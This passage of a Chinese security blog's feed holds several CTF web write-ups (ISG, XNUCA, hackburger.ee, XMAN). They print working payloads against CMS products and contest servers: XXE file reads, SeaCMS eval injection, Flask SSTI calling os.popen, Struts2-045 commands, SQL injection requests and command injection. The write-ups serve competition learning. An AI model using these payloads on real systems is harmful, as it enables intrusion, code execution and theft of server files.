class="line"><span class="keyword">print</span> <span class="string">"m:"</span>,m</div><div class="line">flag = libnum.n2s(m)</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p><code>so_low</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmmmmmmm，关于比赛质量问题，出门左转&lt;a href=&quot;https://www.zhihu.com/question/66360616&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;知乎&lt;/a&gt;，出门右转&lt;a href=&quot;https://ctfrank.org/events/39&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfrank&lt;/a&gt;&lt;br&gt;昨天竟然接到了决赛通知电话，考虑到各种问题，最后还是弃权了&lt;br&gt;以下是线上赛wp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 ISG信息安全技能大赛线上赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/08/31/2017-isg-writeup/"/>
    <id>https://www.codemonster.cn/2017/08/31/2017-isg-writeup/</id>
    <published>2017-08-31T15:05:27.000Z</published>
    <updated>2018-05-04T07:47:50.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>加群在公告得到一串字符，16进制转字符串得到flag<br><a id="more"></a></p>
<h2 id="ISGCoinMarket"><a href="#ISGCoinMarket" class="headerlink" title="ISGCoinMarket"></a>ISGCoinMarket</h2><p>很有意思的题，初始给你1元人民币和0.0056个ISG币，你可以发布交易，也可以和别人交易，通过交易得到2000人民币和2000ISG币即可得到flag。</p>
<p>这里主要是没有限制负数，我的解法是创建4个号</p>
<p>u1-&gt;u2   把u1的ISG币刷到4000000，汇率为0.0059，可以看作<code>u1低价买入ISG</code></p>
<p>u3-&gt;u4   把u3的ISG币刷到40000000，人民币为负数，u4则相反</p>
<p>然后利用u4的人民币去买u1的ISG，汇率位0.0054，可以看作<code>u1高价卖出ISG</code></p>
<p>一买一卖u1就挣到了足够的钱</p>
<p><img src="/img/2017isg1.png" alt=""> </p>
<h2 id="Remix"><a href="#Remix" class="headerlink" title="Remix"></a>Remix</h2><p>可以读取图片并base64解码，并不知道后台逻辑，右键查看源代码提示flag在7827端口（我也不记得是不是这个端口），于是想到SSRF，构造<br><code>?targe=http://localhost:7827</code>,<br>将得到的base64解码即可得到flag</p>
<h2 id="wmwcms"><a href="#wmwcms" class="headerlink" title="wmwcms"></a>wmwcms</h2><p>robots.txt提示给了个rar，下载下来是网站源码，审计发现连接数据库时存在注入，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
<p>第8行的数据库连接可以由用户控制，于是我们在远程服务器搭建相同的数据库、用户密码也相同、表名和字段也相同，然后构造<br><code>dsn=wmwcms;8.8.8.8</code><br>即可让这道题连接到你的服务器，然后使用<code>action=img</code>读取数据库中<code>portrait</code>字段所在位置的文件，即可读取到flag</p>
<h2 id="BMP-Wannacry-2"><a href="#BMP-Wannacry-2" class="headerlink" title="BMP Wannacry-2"></a>BMP Wannacry-2</h2><p>大佬说是<code>bmp隐写</code>，没做出来，留坑待填</p>
<p><a href="https://doegox.github.io/ElectronicColoringBook/" target="_blank" rel="noopener">https://doegox.github.io/ElectronicColoringBook/</a></p>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>这个比赛难度中上，参赛对象为各大企业安全团队，看到了许多大佬，膜</p>
<p><img src="/img/2017isg2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;加群在公告得到一串字符，16进制转字符串得到flag&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="审计" scheme="https://www.codemonster.cn/tags/%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="注入" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2017 XNUCA-第一期：Web WriteUp</title>
    <link href="https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/"/>
    <id>https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/</id>
    <published>2017-08-30T14:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="No-1-你喜欢颜文字么"><a href="#No-1-你喜欢颜文字么" class="headerlink" title="#No.1 你喜欢颜文字么"></a>#No.1 你喜欢颜文字么</h2><p>重置密码输入admin和喜欢就拿下flag了<br><a id="more"></a></p>
<h2 id="No-2-让你无语的md5"><a href="#No-2-让你无语的md5" class="headerlink" title="#No.2 让你无语的md5"></a>#No.2 让你无语的md5</h2><p>输入admin提示非法，输入admin加一个空格拿到一个md5，解密得到flag</p>
<h2 id="No-3-Pav1和lloowweerr…"><a href="#No-3-Pav1和lloowweerr…" class="headerlink" title="#No.3 Pav1和lloowweerr…"></a>#No.3 Pav1和lloowweerr…</h2><p><code>FFmpeg任意文件读取</code>漏洞，构造读取flag文件的avi，上传后下载打开得到flag<br>参考链接：<a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/138377.html</a></p>
<h2 id="No-4-X-NUCA-2017’s-S…"><a href="#No-4-X-NUCA-2017’s-S…" class="headerlink" title="#No.4 X-NUCA 2017’s S…"></a>#No.4 X-NUCA 2017’s S…</h2><p>没做出来<br>ROIS WriteUp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/res/site.war 下载源码 zip 解压 jd-gui 看 class</div><div class="line">注册的时候加一个 isActive=1 就能登录</div><div class="line">然后现在是要让 isSupaAdministrata=1</div><div class="line">参考 http://blog.csdn.net/qq_27446553/article/details/73480823 对象自动绑定</div><div class="line">拿到http://a4b359466421ae3aa76a8b116dda3870.xnuca.cn/res/HYGorlL29LtcMCR6GUg23XRM</div><div class="line">JxVge5F7.js</div></pre></td></tr></table></figure></p>
<h2 id="No-5-Lucky-Number-Ca…"><a href="#No-5-Lucky-Number-Ca…" class="headerlink" title="#No.5 Lucky Number Ca…"></a>#No.5 Lucky Number Ca…</h2><p><code>Xxe</code>，构造post内容如下，但是死都找不到flag，赛后听说在/etc/hosts，感觉这种藏着掖着flag的题很没意思<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE xdsec[</span></div><div class="line"><span class="meta">&lt;!ELEMENT methodname ANY&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="No-6-Hello-World"><a href="#No-6-Hello-World" class="headerlink" title="#No.6 Hello World"></a>#No.6 Hello World</h2><p>看提示直接fuzz到.git目录，下载下来后可以看到代码。<br>有个<code>flag.php</code> 和<code>flag.js</code>，flag.php提示flag not here<br>猜测用了git的修改记录隐藏数据，在日志中看不到其他的修改日志<br>可以用<code>显示引用记录</code>的方式查看。<br>然后又找到一个flag.js比较两个flag.js得到<code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></p>
<h2 id="No-7-xblog"><a href="#No-7-xblog" class="headerlink" title="#No.7 xblog"></a>#No.7 xblog</h2><p>有源码泄露，但是没做出来</p>
<h2 id="No-8-看视频真嗨皮"><a href="#No-8-看视频真嗨皮" class="headerlink" title="#No.8 看视频真嗨皮"></a>#No.8 看视频真嗨皮</h2><p><code>海洋cms</code><br>找到<code>exp</code>构造<code>post</code>数据即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://567252405122515e0ed912af9b26d404.xnuca.cn/search.php?searchtype=5</div></pre></td></tr></table></figure></p>
<p>post数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchword=d&amp;order=&#125;&#123;endif&#125;&#123;if:1)eval($_POST[x]);if(1&#125;&#123;end if&#125;&amp;x=$TxtRes=file_put_contents(&quot;writeHere/da6afcecd8a4915e67964700d2008d29&quot;, &quot;test&quot;);echo 666;</div></pre></td></tr></table></figure></p>
<p>参考链接：<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28" target="_blank" rel="noopener">http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28</a></p>
<h2 id="No-9-The-Best-Commun…"><a href="#No-9-The-Best-Commun…" class="headerlink" title="#No.9 The Best Commun…"></a>#No.9 The Best Commun…</h2><p><code>Dolphin</code><br>直接exp打，本来就想随便试一试结果直接进到一个命令行模式，就是成功了，输入system();命令拿flag<br>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-92546" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92546</a></p>
<h2 id="No-10-买买买！"><a href="#No-10-买买买！" class="headerlink" title="#No.10 买买买！"></a>#No.10 买买买！</h2><p>没做</p>
<h2 id="No-11-两只小蜜蜂啊"><a href="#No-11-两只小蜜蜂啊" class="headerlink" title="#No.11 两只小蜜蜂啊"></a>#No.11 两只小蜜蜂啊</h2><p><code>Beescms</code><br>跟着exp走，先拿后台权限在上传shell<br>参考链接：<a href="https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike</a></p>
<h2 id="No-12-社工库"><a href="#No-12-社工库" class="headerlink" title="#No.12 社工库"></a>#No.12 社工库</h2><p>没做</p>
<h2 id="No-13-程序员怎么能不知道Jenkin…"><a href="#No-13-程序员怎么能不知道Jenkin…" class="headerlink" title="#No.13 程序员怎么能不知道Jenkin…"></a>#No.13 程序员怎么能不知道Jenkin…</h2><p><code>Jenkins</code><br>找到了exp但是没打成功</p>
<h2 id="No-14-试一试"><a href="#No-14-试一试" class="headerlink" title="#No.14 试一试"></a>#No.14 试一试</h2><p><code>多米cms</code>，有个通用注入漏洞，但是好像加了waf，没有花时间去绕过，没做出来<br>ROIS的payload：<code>search.php?jq=1);system(dir);//&amp;searchtype=5</code></p>
<h2 id="No-15-猜一猜"><a href="#No-15-猜一猜" class="headerlink" title="#No.15 猜一猜"></a>#No.15 猜一猜</h2><p><code>Joomla</code></p>
<p>没做出来</p>
<h2 id="No-16-来一发flask"><a href="#No-16-来一发flask" class="headerlink" title="#No.16 来一发flask"></a>#No.16 来一发flask</h2><p><code>Flask</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://062ed0f9233795319ceac93209b40860.xnuca.cn/invalid&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/flag.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<p>只读了flag，写的部分没有成功<br>参考链接：<a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a><br>ROIS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;id&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<h2 id="No-17-简单点"><a href="#No-17-简单点" class="headerlink" title="#No.17 简单点"></a>#No.17 简单点</h2><p><code>CMS Made Simpl CMS</code></p>
<p>没做出来</p>
<h2 id="No-18-“开讲啦”"><a href="#No-18-“开讲啦”" class="headerlink" title="#No.18 “开讲啦”"></a>#No.18 “开讲啦”</h2><p><code>Acontent</code>，查到了cve但是没利用成功<br>Ph0en1x WriteUp：<br><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php</div><div class="line">POST:</div><div class="line">grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt</div></pre></td></tr></table></figure></p>
<h2 id="No-19-写个简历吧"><a href="#No-19-写个简历吧" class="headerlink" title="#No.19 写个简历吧"></a>#No.19 写个简历吧</h2><p>没做</p>
<h2 id="No-20-SQL注入"><a href="#No-20-SQL注入" class="headerlink" title="#No.20 SQL注入"></a>#No.20 SQL注入</h2><p>也是<code>Joomla</code>，没做</p>
<h2 id="No-21-Freecms"><a href="#No-21-Freecms" class="headerlink" title="#No.21 Freecms"></a>#No.21 Freecms</h2><p><code>Freecms</code><br>Struts2-045直接打<code>http://cc7777fe6a8ce0d9544b623a0d2961fb.xnuca.cn/login_login.do</code><br><code>echo &quot;111&quot; &gt;/opt/apache-tomcat-8.0.44/webapps/ROOT/writeHere/da6afcecd8a4915e67964700d2008d29</code></p>
<h2 id="No-22-Phpcms-v9"><a href="#No-22-Phpcms-v9" class="headerlink" title="#No.22 Phpcms_v9"></a>#No.22 Phpcms_v9</h2><p><code>Phpcms9.6.3</code>，没做出来，貌似还加了waf</p>
<h2 id="No-23-找入口"><a href="#No-23-找入口" class="headerlink" title="#No.23 找入口"></a>#No.23 找入口</h2><p><code>Wolfcms</code><br>admin admin 进后台，上传php拿到shell<br>参考链接：<a href="http://blog.csdn.net/hitwangpeng/article/details/45620701" target="_blank" rel="noopener">http://blog.csdn.net/hitwangpeng/article/details/45620701</a></p>
<h2 id="No-24-可爱的星星"><a href="#No-24-可爱的星星" class="headerlink" title="#No.24 可爱的星星"></a>#No.24 可爱的星星</h2><p><code>Sitestar 建站之星</code>，没找到可用exp<br>ROIS:<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/index.php?_a=do_mail&amp;_m=mod_email</span> HTTP/1.1</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</div><div class="line"><span class="attribute">Cookie</span>: PHPSESSID=65676uue8hmaigepggn66pn1l6</div><div class="line"><span class="attribute">Host</span>: 522e52f9f4f81b75b2718ad29ac60c14.xnuca.cn</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">User-Agent</span>: Paw/3.1.2 (Macintosh; OS X/10.12.6) GCDHTTPRequest</div><div class="line"><span class="attribute">Content-Length</span>: 112</div><div class="line">title=aa&amp;email_s=a&amp;email_m=a&amp;type=a&amp;users=aaaa%27%7Caaa&amp;role%5B%5D=abdc%7D%27+union+select+</div><div class="line"><span class="attribute">1%2Cuser%28%29%2C3%23</span></div></pre></td></tr></table></figure></p>
<p>注入得到 <code>admin</code> 密码 <code>1234!@#$</code><br>登录之后上传图片，文件管理中重命名为.php</p>
<h2 id="No-25-愉快的玩耍吧"><a href="#No-25-愉快的玩耍吧" class="headerlink" title="#No.25 愉快的玩耍吧"></a>#No.25 愉快的玩耍吧</h2><p><code>Metinfo cms</code><br>跟着exp，重置admin密码为1234567，进后台上传test.php打包成的zip，type改成skin，然后templates/test.php就是flag<br>参考链接：<a href="https://www.secpulse.com/archives/41084.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41084.html</a></p>
<h2 id="No-26-挑战自我"><a href="#No-26-挑战自我" class="headerlink" title="#No.26 挑战自我"></a>#No.26 挑战自我</h2><p>没做</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h2><p>整个比赛难度中等，基本都是在找现成exp，我们队除了MD5那题其他都是我A的，中间一度霸占榜一，但是最终排名第九，要反思的还是很多的。<br>放个图纪念曾经的榜一。<br><img src="/img/2017xnuca1.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;No-1-你喜欢颜文字么&quot;&gt;&lt;a href=&quot;#No-1-你喜欢颜文字么&quot; class=&quot;headerlink&quot; title=&quot;#No.1 你喜欢颜文字么&quot;&gt;&lt;/a&gt;#No.1 你喜欢颜文字么&lt;/h2&gt;&lt;p&gt;重置密码输入admin和喜欢就拿下flag了&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="CMS" scheme="https://www.codemonster.cn/tags/CMS/"/>
    
      <category term="EXP" scheme="https://www.codemonster.cn/tags/EXP/"/>
    
      <category term="getshell" scheme="https://www.codemonster.cn/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>2017 hackburger.ee 部分题 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/"/>
    <id>https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/</id>
    <published>2017-07-28T08:13:54.000Z</published>
    <updated>2018-05-04T07:47:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>hackburger.ee一共只有10道题，但是都非常有意思，花了些时间做出了5道，这里记录一下，后续做出来的也会更新上来<br><a id="more"></a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>A ping utility, to ping stuff, you know<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/</div></pre></td></tr></table></figure></p>
<p>命令执行漏洞，%0a换行后就可以执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/?host=127.0.0.1%0als</div></pre></td></tr></table></figure></p>
<p>然后cat flag.php即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is f1b35744925a3f5946c542a1ee64267af8b93b06</div></pre></td></tr></table></figure></p>
<h2 id="File-search"><a href="#File-search" class="headerlink" title="File search"></a>File search</h2><p>Here you can search files<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8004/</div></pre></td></tr></table></figure></p>
<p>fuzz中发现这题的搜索框会搜索到文件名或内容包含该字符串的文件，很多人用burp手动跑，我就用py写了个小脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line">str=<span class="string">"abcdefhijklmnopqrstuvwxyz1234567890_g"</span></div><div class="line">ls=len(str)</div><div class="line">url=<span class="string">"http://burger.laboratorium.ee:8004/"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">postq</span><span class="params">(s1)</span>:</span></div><div class="line">    data=&#123;<span class="string">"query"</span>:s1&#125;</div><div class="line">    r1=r.post(url=url,data=data)</div><div class="line">    <span class="keyword">return</span> len(re.findall( <span class="string">r'flag.txt'</span>, r1.text))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=s+i</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun1(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=i+s</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun2(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="keyword">print</span> fun2(fun1(flag)[<span class="number">0</span>:<span class="number">-1</span>])[<span class="number">1</span>:]</div></pre></td></tr></table></figure></p>
<p>这里把g字符放到了后面，因为怕匹配出flag字符串，最后flag为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t_h_e__f_l_a_g__i_s__c82584c307421228a3c5c5e4dc6a3ea31859975e</div></pre></td></tr></table></figure></p>
<h2 id="Number-to-ASCII-converter"><a href="#Number-to-ASCII-converter" class="headerlink" title="Number to ASCII converter"></a>Number to ASCII converter</h2><p>A tool to convert numbers to ASCII characters<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/</div></pre></td></tr></table></figure></p>
<p>题目给了源代码，很容易看出<code>assert($_GET[&#39;number&#39;], &quot;Number is zero&quot;);</code>这里存在<code>命令执行漏洞</code><br>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/?number=eval(system(&quot;cat where/is/the/flag/i/am/looking/for/flag.php&quot;))</div></pre></td></tr></table></figure></p>
<p>读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is adb92727cb7edc1802eb4616d23aef3ffaa928a4</div></pre></td></tr></table></figure></p>
<h2 id="That’s-not-how-you-write-signup"><a href="#That’s-not-how-you-write-signup" class="headerlink" title="That’s not how you write signup"></a>That’s not how you write signup</h2><p>A login form and a registration form. With some problems (but not SQL injection, SQLi is boring).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8002/</div></pre></td></tr></table></figure></p>
<p>题目给了登录和注册功能，源代码也给了，提示不是注入，又需要admin登录，就想到一个姿势，mysql字符截断漏洞,因为没有限制用户名长度，就可以注册一个用户名为<code>admin                         (...很多空格...)111</code>的用户，然后就可以登录admin账号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Flag is ad0f46b77ae29d84a5f2b3a9b0784853d2aee093</div></pre></td></tr></table></figure>
<h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>The description left out intentionally. Flag3 is currently unavailable, enter 0 instead.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8006/</div></pre></td></tr></table></figure></p>
<p>考察的是扫描器？？robots.txt有个flag，index.php~有个flag，.git泄露，用githack爬下来index.php里面有个flag，拼接起来就是最后的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">47b9664515420d44d2c77dc593f7514ccbd17be8_392d28473a135c2491c227f373d0eed0310e13e3_0_ebb696a5abb04c8875a0afa29f6dc8d167db67e8</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hackburger.ee一共只有10道题，但是都非常有意思，花了些时间做出了5道，这里记录一下，后续做出来的也会更新上来&lt;br&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="mysql字符截断" scheme="https://www.codemonster.cn/tags/mysql%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD/"/>
    
      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
    
      <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="命令执行" scheme="https://www.codemonster.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="源码泄露" scheme="https://www.codemonster.cn/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>2017 XMAN选拔赛WEB部分 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/07/26/2017-xman-audition-web-writeup/"/>
    <id>https://www.codemonster.cn/2017/07/26/2017-xman-audition-web-writeup/</id>
    <published>2017-07-26T03:10:35.000Z</published>
    <updated>2018-05-04T07:47:50.013Z</updated>
    
    <content type="html"><![CDATA[<h2 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h2><a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'你的答案不对0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
